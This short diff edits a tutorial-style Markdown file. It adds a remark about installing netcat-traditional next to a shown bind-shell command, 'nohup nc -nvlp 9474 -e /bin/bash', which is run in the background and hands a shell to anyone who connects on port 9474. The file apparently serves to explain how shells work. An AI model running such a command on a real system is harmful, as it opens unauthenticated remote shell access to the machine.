@@ -70,6 +70,7 @@ a bindshell running on the system). First run a bind shell like so:
 ```bash
 nohup nc -nvlp 9474 -e /bin/bash >/dev/null 2>&1 &
 ```
+(note, you may have to install `netcat-traditional` for this to work).
 
 This listens on port 9474, and when a client connects it will spawn a shell and
 send output back out over the network socket. The `nohup` command prevents the
